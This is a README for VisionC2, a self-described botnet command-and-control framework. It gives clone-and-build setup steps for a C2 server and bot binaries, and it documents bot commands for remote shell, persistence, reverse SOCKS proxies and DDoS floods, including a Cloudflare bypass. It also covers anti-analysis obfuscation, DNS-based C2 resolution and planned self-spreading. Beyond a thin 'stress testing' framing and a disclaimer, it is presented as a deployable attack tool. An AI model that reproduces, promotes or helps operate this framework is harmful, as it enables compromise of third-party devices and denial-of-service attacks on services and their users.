
# VisionC2 – Advanced Botnet Command & Control Framework

## 📑 Table of Contents
- [📋 Changelog](#-changelog)
- [🚀 Installation & Setup](#-installation--setup)
  - [Prerequisites](#prerequisites)
  - [⭐ Use the Setup Wizard (Recommended)](#-use-the-setup-wizard-recommended)
- [🎯 Quick Usage](#-quick-usage)
- [🛠️ Command Reference](#️-command-reference)
  - [User Management](#user-management)
  - [Bot Operations](#bot-operations)
  - [Network Operations](#network-operations)
  - [Stress Testing](#stress-testing)
- [🏗️ Architecture Overview](#️-architecture-overview)
- [📋 WIP/TODO](#-wiptodo)
- [⚖️ Disclaimer](#️-disclaimer)
- [🤝 Community & Support](#-community--support)
  - [Contributing](#contributing)
  - [Acknowledgments](#acknowledgments)

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3.3-red)
![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

**VisionC2** 
*is an advanced cross-arch botnet focused on network stress testing it features end-to-end TLS 1.3 encryption, anti-analysis techniques, and DDOS/RCE/SOCKS modules. Vision is built to be setup via setup script meaning there are no code changes required.*

---
<img width="562" height="1314" alt="Screenshot 2026-01-28 235647" src="https://github.com/user-attachments/assets/18dba9dd-3067-4b7b-9bcf-a41e1db5b031" />

## 🚀 Installation & Setup

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3
# Go 1.23+ required - see https://go.dev/dl/
```

### ⭐ Use the Setup Wizard (Recommended)

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

> 💡 **Setup Wizard handles Encryption, Certs, and Code Updates. The entire setup for Vision takes no more then 5 minutes.**

---

```
╔══════════════════════════════════════════════════════════╗
║              Select Setup Mode                           ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [1] Full Setup                                          ║
║      New C2 address, magic code, certs, everything       ║
║      Use for: Fresh install or complete rebuild          ║
║                                                          ║
║  [2] C2 URL Update Only                                  ║
║      Change C2 domain/IP, keep magic code & certs        ║
║      Use for: Server migration, domain change            ║
║                                                          ║
║  [0] Exit                                                ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
➜ Select option [1]: 1
[i] Starting Full Setup...

╔══════════════════════════════════════════════════════════╗
║ Step 1/5: C2 Server Configuration                        ║
╚══════════════════════════════════════════════════════════╝

➜ Enter C2 server IP/domain [127.0.0.1]: c2.domain.com
➜ Enter admin server port [420]: 200
[✓] C2 configured: c2.domain.com:443
[✓] Admin port: 200
[i] Bot connection port is fixed at 443 (TLS)

╔══════════════════════════════════════════════════════════╗
║ Step 2/5: Security Token Generation                      ║
╚══════════════════════════════════════════════════════════╝

[i] Auto-generated Magic Code: 9rOKxDR%EV&90*X%
[i] Auto-generated Protocol Version: V3_3
[i] Auto-generated Crypt Seed: 3c841808

? Use auto-generated security tokens? [Y/n]: y
[i] Applying multi-layer obfuscation...
[✓] C2 address obfuscation verified ✓

╔══════════════════════════════════════════════════════════╗
║ Step 3/5: TLS Certificate Generation                     ║
╚══════════════════════════════════════════════════════════╝

[i] Certificate details (press Enter for defaults):

➜ Country code (2 letter) [US]: US
➜ State/Province [California]: California
➜ City [San Francisco]: San Francisco
➜ Organization [Security Research]: Sec Team
➜ Common Name (domain) [c2.domain.com]: 
➜ Valid days [365]: 360
[i] Generating 4096-bit RSA private key...
[i] Generating self-signed certificate...
[✓] TLS certificates generated successfully

╔══════════════════════════════════════════════════════════╗
║ Step 4/5: Updating Source Code                           ║
╚══════════════════════════════════════════════════════════╝

[i] Updating cnc/main.go...
[✓] CNC configuration updated
[i] Updating bot/main.go...
[✓] Bot configuration updated

╔══════════════════════════════════════════════════════════╗
║ Step 5/5: Building Binaries                              ║
╚══════════════════════════════════════════════════════════╝

? Build CNC server? [Y/n]: y
[i] Building CNC server...
[✓] CNC server built successfully
? Build bot binaries (14 architectures)? [Y/n]: y
[!] This will take several minutes...
[i] Building bot binaries for 14 architectures...
[i] This may take a few minutes...
```

**That's it!** The wizard handles everything:

- C2 address configuration & obfuscation
- Random magic codes & protocol versions  
- TLS certificate generation
- Source code updates
- Building CNC + 14 bot architectures

## 🎯 Quick Usage

```bash
# Start server
cd cnc && ./cnc

# Connect admin (in another terminal)
nc YOUR_IP YOUR_ADMIN_PORT
# Type "spamtec" → login prompt appears

# Bot binaries ready in: bot/bins/
optional: protect UPX packed binaries from string analysis https://github.com/Syn2Much/upx-stripper
```

## 🏗️ Architecture Overview

VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:

```
┌─────────────────┐    TLS 1.3    ┌─────────────────┐
│   Admin Console │◄──────────────►│    C2 Server    │
│  (Multi-User)   │                │  (Go Backend)   │
└─────────────────┘                └─────────────────┘
                                         │ TLS 1.3
                                         ▼
┌─────────────────┐                ┌─────────────────┐
│   Bot Agents    │◄───────────────┤  Bot Registry   │
│ (14+ Architectures)│                │ & Management │
└─────────────────┘                └─────────────────┘
```

```
┌──────────────────────────────────────────────────────────────┐
│ 📡 C2 Resolution - How Bots Find Your Server                 │
├──────────────────────────────────────────────────────────────┤
│ The bot uses a multi-method resolution system:               │
│                                                              │
│ Resolution Order (automatic fallback):                       │
│   1. DNS TXT Record  → Checks for TXT record on domain       │
│   2. DoH TXT Lookup  → Cloudflare/Google DNS-over-HTTPS      │
│   3. A Record        → Falls back to standard DNS A record   │
│   4. Direct IP       → Uses the value as-is if IP:port       │
│                                                              │
│ You can enter:                                               │
│   • Direct IP      → 192.168.1.100 (simplest)                │
│   • Domain name    → c2.example.com (uses A record)          │
│   • TXT domain     → lookup.example.com (advanced)           │
└──────────────────────────────────────────────────────────────┘
```

## 🛠️ Command Reference

### User Management

- `help` - Context-aware help system (shows available commands)
- `db` - User database management (Owner only)
- `private` - Specialized commands based on clearance level

### Bot Operations

- `bots` - List all active agents with detailed status
- `!<botid> <command>` - Target specific agent
- `!info` - Comprehensive system intelligence
- `!persist` - Enhanced persistence mechanisms
- `!reinstall` - Agent redeployment
- `!lolnogtfo` - Secure agent removal

### Network Operations  

- `!socks <port>` - Establish SOCKS5 reverse proxy
- `!stopsocks` - Terminate proxy connections
- `!shell <command>` - Secure remote execution
- `!detach <command>` - Background process execution
- `!stream <command>` - Real-time output streaming

### Stress Testing

- `!udpflood <ip> <port> <duration>`
- `!tcpflood <ip> <port> <duration>`
- `!http <url/ip> <port> <duration>`
- `!https <url> <duration>` - TLS 1.3 flood with HTTP/2 fingerprinting
- `!tls <url> <duration>` - Alias for HTTPS flood
- `!cfbypass <url> <duration>` - Cloudflare UAM bypass attack
- `!syn/!ack/!gre/!dns` - Protocol-specific attacks

## 📋 Changelog

### v3.3 - February 2026

- `!stop` command - Instantly halt all running attacks
- HTTPS/TLS 1.3 flood attack with HTTP/2 fingerprinting
- Cloudflare UAM bypass attack
- DNS TXT record C2 resolution with DoH fallback
- Multi-layer encryption (RC4 + XOR + byte substitution + MD5)
- Setup wizard with menu system (Full Setup / C2 Update Only)
- Fixed SOCKS5 proxy, target resolution, telnet handling
- Anti-analysis obfuscation (meaningless function names)

### v3.2 - January 2026

- Added Reverse Socks 5 Modules
- Cleaned up CNC UI
- Built Setup.py to automate setup process

### v3.1 - December 2025

- Initial release with TLS 1.3 encrypted communications
- 14 architecture cross-compilation support
- HMAC challenge-response authentication

## 📋 WIP/TODO
- Multiple/Rotating Ports
- Locker/Killer to stay on the device and kill competing malware
- Spread/Self-Rep Mechanism
- Enhanced Daemonize
- Single Instance/Port Takeover Networking  

## ⚖️ Disclaimer

**Authorized security research only.** Obtain written permission before use. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

## 🤝 Community & Support

### Contributing

We welcome contributions from security professionals:

- Code improvements and optimizations
- Additional evasion techniques
- Enhanced security features
- Documentation and examples 

### Acknowledgments

Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo

📧 **Contact**: [dev@sinners.city](mailto:dev@sinners.city)
